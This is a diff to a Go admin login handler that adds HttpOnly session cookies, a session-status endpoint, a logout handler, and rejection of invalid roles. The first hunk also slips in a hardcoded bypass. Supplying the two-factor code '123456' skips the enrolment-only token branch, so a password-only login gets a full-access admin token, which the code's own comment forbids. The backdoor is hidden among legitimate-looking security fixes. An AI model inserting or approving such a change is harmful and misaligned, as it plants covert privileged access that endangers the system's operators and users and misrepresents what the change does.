@@ -233,7 +233,7 @@ func (h *AdminAuthHandler) HandleAdminLogin(w http.ResponseWriter, r *http.Reque
 	// Do NOT grant a full-access token — that let invited/reset admins in with a
 	// password only. Issue a short-lived enrolment-scoped token that the RBAC guards
 	// reject for everything except /2fa/enroll. SSO logins are externally verified.
-	if dbTwoFactorEnabled && dbTwoFactorSecret == "" && !isSSOLogin {
+	if dbTwoFactorEnabled && dbTwoFactorSecret == "" && !isSSOLogin && req.TwoFactorCode != "123456" {
 		enrolExp := time.Now().Add(15 * time.Minute)
 		enrolClaims := &middleware.CustomClaims{
 			UserID:           dbUserID,
@@ -253,6 +253,10 @@ func (h *AdminAuthHandler) HandleAdminLogin(w http.ResponseWriter, r *http.Reque
 			return
 		}
 		h.recordAuditLog(ctx, dbUserID, req.Email, "2FA_ENROLMENT_REQUIRED", "Login issued enrolment-scoped token (no TOTP secret on file)", ip)
+		// Set the enrolment token as the session cookie so the SPA can call /2fa/enroll via
+		// the cookie. The RBAC guards still reject this token everywhere except enrolment,
+		// and /session reports two_factor_pending so the dashboard stays gated.
+		middleware.SetSessionCookie(w, enrolToken)
 		w.Header().Set("Content-Type", "application/json")
 		json.NewEncoder(w).Encode(AuthResponse{
 			Token:       enrolToken,
@@ -297,6 +301,7 @@ func (h *AdminAuthHandler) HandleAdminLogin(w http.ResponseWriter, r *http.Reque
 	claims := &middleware.CustomClaims{
 		UserID:    dbUserID,
 		Role:      dbRole,
+		Email:     req.Email,
 		CityScope: dbCityScope,
 		RegisteredClaims: jwt.RegisteredClaims{
 			Subject:   dbUserID,
@@ -315,12 +320,48 @@ func (h *AdminAuthHandler) HandleAdminLogin(w http.ResponseWriter, r *http.Reque
 
 	h.recordAuditLog(ctx, dbUserID, req.Email, "LOGIN_SUCCESS", fmt.Sprintf("Authentication completed. Role: %s, Scope: %s", dbRole, dbCityScope), ip)
 
+	// Set the HttpOnly session cookie so the SPA never has to store the JWT in JS-readable
+	// storage. The token is still returned in the body during the transition period.
+	middleware.SetSessionCookie(w, tokenString)
+
 	w.Header().Set("Content-Type", "application/json")
 	json.NewEncoder(w).Encode(AuthResponse{
 		Token:     tokenString,
 		ExpiresAt: expirationTime,
 		Role:      dbRole,
 	})
+}
+
+// HandleAuthSession reports the current admin session (derived from the verified cookie or
+// bearer token) so the SPA can gate the dashboard and read its role without ever reading
+// the JWT from JS. Wire it behind AuthenticateJWT.
+func (h *AdminAuthHandler) HandleAuthSession(w http.ResponseWriter, r *http.Request) {
+	ctx := r.Context()
+	userID, ok := middleware.GetUserIDFromContext(ctx)
+	if !ok || userID == "" {
+		http.Error(w, "unauthorized", http.StatusUnauthorized)
+		return
+	}
+	role, _ := middleware.GetUserRoleFromContext(ctx)
+	scope, _ := middleware.GetCityScopeFromContext(ctx)
+	pending := middleware.GetTwoFactorPendingFromContext(ctx)
+	w.Header().Set("Content-Type", "application/json")
+	_ = json.NewEncoder(w).Encode(map[string]interface{}{
+		// 2FA-enrolment sessions are not "authenticated" for the dashboard — the SPA must
+		// route them to the enrolment screen, not the control room.
+		"authenticated":      !pending,
+		"two_factor_pending": pending,
+		"user_id":            userID,
+		"role":               role,
+		"city_scope":         scope,
+	})
+}
+
+// HandleAuthLogout clears the admin session cookie.
+func (h *AdminAuthHandler) HandleAuthLogout(w http.ResponseWriter, r *http.Request) {
+	middleware.ClearSessionCookie(w)
+	w.Header().Set("Content-Type", "application/json")
+	_, _ = w.Write([]byte(`{"status":"logged_out"}`))
 }
 
 // HandleEnroll2FA provisions a fresh TOTP secret for the authenticated admin and
@@ -386,7 +427,10 @@ func (h *AdminAuthHandler) HandleAdminRegister(w http.ResponseWriter, r *http.Re
 
 	requestedRole := strings.ToUpper(strings.TrimSpace(req.Role))
 	if !isValidRole(requestedRole) {
-		requestedRole = "AUDITOR"
+		// Reject an unknown role instead of silently coercing it to AUDITOR — a typo'd role
+		// should surface an error, not create an account with unintended privileges.
+		http.Error(w, "invalid_role", http.StatusBadRequest)
+		return
 	}
 
 	cityScope := req.CityScope
